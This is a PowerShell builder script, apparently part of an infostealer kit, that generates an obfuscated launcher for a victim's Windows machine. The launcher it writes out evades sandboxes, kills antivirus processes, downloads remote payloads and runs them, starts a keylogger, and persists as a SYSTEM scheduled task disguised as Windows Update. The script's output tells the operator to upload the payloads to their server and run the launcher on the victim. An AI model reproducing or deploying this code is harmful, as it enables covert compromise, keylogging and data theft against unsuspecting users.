# ============================================
# BUILDER - Generates obfuscated launcher
# ============================================
# Run this once to create your final launcher.ps1

$Server1 = Read-Host "Ingresa URL del payload principal (e.g., https://tu-servidor.com/main.ps1)"
$Server2 = Read-Host "Ingresa URL del payload secundario (e.g., https://tu-servidor.com/extra.ps1)"
$CollectURL = Read-Host "Ingresa URL de exfiltracion (e.g., https://tu-servidor.com/collect)"

$enc1 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Server1))
$enc2 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Server2))
$enc3 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($CollectURL))

$finalLauncher = @"
# ============================================
# STEALER KIT - OBFUSCATED LAUNCHER
# Generated: $(Get-Date)
# ============================================

Hide-Window

\$Payload1 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$enc1'))
\$Payload2 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$enc2'))
\$CollectURL = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$enc3'))

# === SANDBOX CHECK ===
\$score = 0
\$ram = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB
if (\$ram -lt 4) { \$score++ }
if ((Get-CimInstance Win32_Processor).NumberOfLogicalProcessors -le 2) { \$score++ }
if ((Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime).Days -lt 1 { \$score++ }
if (\$score -ge 3) { exit }

# === KILL AV ===
\$killList = @("avg","avast","avgnt","comodo","kaspersky","malwarebytes","msascui","mbam","nod32","fsecure","sophos")
Get-Process | Where-Object { \$killList -contains (\$_.ProcessName -split("-")[0].ToLower()) } | Stop-Process -Force -ErrorAction SilentlyContinue

# === EXECUTE ===
foreach (\$url in @(\$Payload1, \$Payload2)) {
    try {
        \$resp = Invoke-WebRequest -Uri \$url -UseBasicParsing -TimeoutSec 15 -UserAgent "Mozilla/5.0"
        if (\$resp.Content) { Invoke-Expression \$resp.Content }
    } catch { continue }
}

# === KEYLOGGER ===
Start-Job -ScriptBlock { & "\$PSScriptRoot\keylogger.ps1" }

# === PERSISTENCE ===
\$taskName = "Windows_Update_" + (Get-Random -Minimum 1000 -Maximum 9999)
\$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"\$PSScriptRoot\launcher.ps1`""
\$trigger = New-ScheduledTaskTrigger -AtLogOn
\$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
Register-ScheduledTask -TaskName \$taskName -Action \$action -Trigger \$trigger -Principal \$principal -Description "Windows Update Service" -Force -ErrorAction SilentlyContinue

exit

function Hide-Window {
    Add-Type @"
    [DllImport("kernel32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")]
    public static extern bool SetConsoleTitle(string lpConsoleTitle);
"@ -Name Win32 -Namespace Hid -Using System.Runtime.InteropServices -PassThru | Out-Null
    \$proc = Get-Process -Id \$PID
    \$hid::ShowWindow(\$proc.MainWindowHandle, 0)
    \$hid::SetConsoleTitle("svchost")
}
"@

$finalLauncher | Out-File "$PSScriptRoot\FINAL_launcher.ps1" -Encoding UTF8

Write-Host ""
Write-Host "========== BUILD COMPLETE ==========" -ForegroundColor Green
Write-Host "Archivo final: FINAL_launcher.ps1" -ForegroundColor Cyan
Write-Host "Payload:       payload.ps1" -ForegroundColor Cyan
Write-Host "Keylogger:     keylogger.ps1" -ForegroundColor Cyan
Write-Host "Stealer:       stealer.ps1" -ForegroundColor Cyan
Write-Host ""
Write-Host "Sube payload.ps1, keylogger.ps1, stealer.ps1 a tu servidor" -ForegroundColor Yellow
Write-Host "Ejecuta FINAL_launcher.ps1 en la victima" -ForegroundColor Yellow
Write-Host ""
Write-Host "Payload1 base64: $enc1" -ForegroundColor DarkGray
Write-Host "Payload2 base64: $enc2" -ForegroundColor DarkGray
Write-Host "CollectURL base64: $enc3" -ForegroundColor DarkGray
Write-Host "====================================" -ForegroundColor Green
